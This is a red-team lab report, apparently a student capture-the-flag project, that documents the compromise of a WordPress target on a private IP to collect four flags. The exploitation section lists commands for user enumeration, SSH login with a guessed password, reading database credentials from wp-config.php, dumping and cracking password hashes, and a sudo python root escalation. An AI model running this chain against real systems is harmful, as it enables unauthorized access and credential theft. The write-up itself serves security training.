# Red Team: Summary of Operations

## Table of Contents
- Exposed Services
- Critical Vulnerabilities
- Exploitation

### Exposed Services
_TODO: Fill out the information below._

Nmap scan results for each machine reveal the below services and OS details:

![alt text](https://github.com/Rkelley6045/FinalProject/blob/main/Nmap%20/Nmap_Scan.png "Nmap Scan")

This scan identifies the services below as potential points of entry:
- Target 1
  - List of Exposed Servies: 
  - 22/TCP SSH
  - 80/TCP HTTP
  - 111/TCP rpcbind
  - 139/TCP netbios-ssn
  - 445/TCP netbios-ssn

_TODO: Fill out the list below. Include severity, and CVE numbers, if possible._

The following vulnerabilities were identified on each target:
- Target 1
  - List of critical vlunerabilites: 
  - Wordpress Pingback Locator 
  - Usernmae/Password Login Scanner 
  - XMLRPC DoS 
  - GHOST Vulnerability Scanner
  

_TODO: Include vulnerability scan results to prove the identified vulnerabilities._

![alt text](https://github.com/Rkelley6045/FinalProject/blob/main/WPScan/WPscan_vuln.png "WPscan vulnerabilities")

![alt text](https://github.com/Rkelley6045/FinalProject/blob/main/WPScan/WPscan_users.png "WPscan users")

### Exploitation
_TODO: Fill out the details below. Include screenshots where possible._

The Red Team was able to penetrate `Target 1` and retrieve the following confidential data:
- Target 1
  - `flag1.txt`: ![alt text](https://github.com/Rkelley6045/FinalProject/blob/main/Flags/Flag_1.png "Flag 1")    
    - **Exploit Used**
      - User Enumeration exploit used to scan the WordPress web application to discover usernames of the WordPress site
      - Command run: wpscan --url http://192.168.1.110/wordpress/ --enumerate u
  - `flag2.txt`: ![alt text](https://github.com/Rkelley6045/FinalProject/blob/main/Flags/Flag_2.png "Flag 2")   
    - **Exploit Used**
      - Used SSH to gain a user shell via the user profile discover during the User Enumeration exploit. Found Flag 2 under Micahel's profile, after guessing the password, in the var/www directory.
      - Command run: ssh Michael@192.168.1.110
  - `flag3.txt`: ![alt text](https://github.com/Rkelley6045/FinalProject/blob/main/Flags/Flag_3.png "Flag 3")    
    - **Exploit Used**
      - Obtained MySQL root credentials in the wp-config.php file via Michael's user profile. Explored the wordpress database to uncover Flag 3 in the WordPress table called wp_posts.  
      - Command run: cat /var/www/html/wordpress/wp-config.php 
      - Command run: mysql -u root -p
      - Command run: show databases;
      - Command run: use wordpress;
      - Command run: show tables;
      - Command run: select * from wp_posts;
  - `flag4.txt`: 
  - ![alt text](https://github.com/Rkelley6045/FinalProject/blob/main/Flags/Flag_4.png "Flag 4")    
    - **Exploit Used**
      - Accessed the WordPress database to abstract the user pw hashes (wp_users table) for both users (Michael and Steven). Exfiltrated the password hashes and ran them against the password cracker John. Secured a user shell under the user Steven, checked user priviledges, ran a python command to escalate to root, and obtain Flag 4 in the root home directory.
      - Command run: use wordpress;      
      - Command run: show tables;
      - Command run: select * from wp_users;
      - Command run: SELECT user_pass FROM wp_users INTO OUTFILE '/home/wp_hashes.txt';
      - Command run: john wp_hashes.txt 'from root user on Kali'
      - Command run: ssh Michael@192.168.1.110
      - Command run: su steven
      - Command run: sudo -l
      - Command run: sudo python -c 'import pty:pty.spawn("/bin/bash")'                       
       
